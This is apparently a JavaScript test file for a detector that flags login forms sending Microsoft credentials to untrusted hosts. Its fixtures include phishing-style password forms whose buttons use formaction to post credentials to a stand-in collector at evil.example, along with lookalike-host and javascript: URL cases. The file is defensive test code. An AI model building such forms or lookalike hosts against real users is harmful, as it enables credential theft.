import assert from "node:assert/strict";
import test from "node:test";
import { JSDOM } from "jsdom";
import "./submission-targets.js";

const {
  isAllowedCredentialDestination,
  findUntrustedFormaction,
  effectiveSubmissionUrl,
} = globalThis.CheckSubmissionTargets;

const MARKER = "login.microsoftonline.com";
const PAGE = "https://phish.example/login";

function page(html) {
  return new JSDOM(html, { url: PAGE }).window.document;
}

test("allows the Microsoft login host and its subdomains only", () => {
  assert.equal(
    isAllowedCredentialDestination(
      "https://login.microsoftonline.com/common/login",
      MARKER,
      PAGE
    ),
    true
  );
  assert.equal(
    isAllowedCredentialDestination(
      "https://acct.login.microsoftonline.com/common/oauth2",
      MARKER,
      PAGE
    ),
    true
  );
  assert.equal(
    isAllowedCredentialDestination(
      "https://evil.example/collect?ref=login.microsoftonline.com",
      MARKER,
      PAGE
    ),
    false
  );
  assert.equal(
    isAllowedCredentialDestination(
      "https://login.microsoftonline.com.evil.example/collect",
      MARKER,
      PAGE
    ),
    false
  );
  assert.equal(
    isAllowedCredentialDestination(
      "https://notlogin.microsoftonline.com/collect",
      MARKER,
      PAGE
    ),
    false
  );
  assert.equal(
    isAllowedCredentialDestination("javascript:alert(1)", MARKER, PAGE),
    false
  );
  assert.equal(
    isAllowedCredentialDestination("/collect", MARKER, PAGE),
    false
  );
});

test("blocks a password form whose submit button overrides a Microsoft action", () => {
  const doc = page(`
    <form action="https://login.microsoftonline.com/common/login" method="post">
      <input type="password" name="passwd">
      <button formaction="https://evil.example/collect">Sign in</button>
    </form>
  `);
  const found = findUntrustedFormaction(doc.querySelector("form"), MARKER, PAGE);
  assert.ok(found);
  assert.equal(found.raw, "https://evil.example/collect");
});

test("allows a password form that only posts to Microsoft", () => {
  const doc = page(`
    <form action="https://login.microsoftonline.com/common/login" method="post">
      <input type="password" name="passwd">
      <button type="submit">Sign in</button>
    </form>
  `);
  assert.equal(
    findUntrustedFormaction(doc.querySelector("form"), MARKER, PAGE),
    null
  );
});

test("blocks an external submit button associated with the password form", () => {
  const doc = page(`
    <form id="login" action="https://login.microsoftonline.com/common/login" method="post">
      <input type="password" name="passwd">
    </form>
    <button type="submit" form="login" formaction="https://evil.example/collect">Sign in</button>
  `);
  const found = findUntrustedFormaction(doc.getElementById("login"), MARKER, PAGE);
  assert.ok(found);
  assert.match(found.resolved, /^https:\/\/evil\.example\/collect/);
});

test("ignores formaction on a non-submitting button and on forms without a password", () => {
  const doc = page(`
    <form id="login" action="https://login.microsoftonline.com/common/login" method="post">
      <input type="password" name="passwd">
      <button type="button" formaction="https://evil.example/collect">Help</button>
    </form>
    <form id="search" action="https://login.microsoftonline.com/common/login">
      <input type="text" name="q">
      <button formaction="https://evil.example/collect">Go</button>
    </form>
  `);
  assert.equal(
    findUntrustedFormaction(doc.getElementById("login"), MARKER, PAGE),
    null
  );
  assert.equal(
    findUntrustedFormaction(doc.getElementById("search"), MARKER, PAGE),
    null
  );
});

test("submit-time URL prefers formaction, then the updated form action", () => {
  const base = PAGE;
  assert.equal(
    effectiveSubmissionUrl(
      { hasAttribute() { return true; }, getAttribute() { return "https://login.microsoftonline.com/x"; } },
      {
        hasAttribute(name) { return name === "formaction"; },
        getAttribute() { return "https://evil.example/collect"; },
        formAction: "https://evil.example/collect",
      },
      base
    ),
    "https://evil.example/collect"
  );

  assert.equal(
    isAllowedCredentialDestination(
      effectiveSubmissionUrl(
        {
          hasAttribute() { return true; },
          getAttribute() { return "https://evil.example/collect"; },
        },
        { hasAttribute() { return false; }, formAction: "https://evil.example/collect" },
        base
      ),
      MARKER,
      base
    ),
    false
  );

  assert.equal(
    isAllowedCredentialDestination(
      effectiveSubmissionUrl(
        {
          hasAttribute() { return true; },
          getAttribute() { return "https://login.microsoftonline.com/common/login"; },
        },
        {
          hasAttribute() { return false; },
          formAction: "https://login.microsoftonline.com/common/login",
        },
        base
      ),
      MARKER,
      base
    ),
    true
  );
});
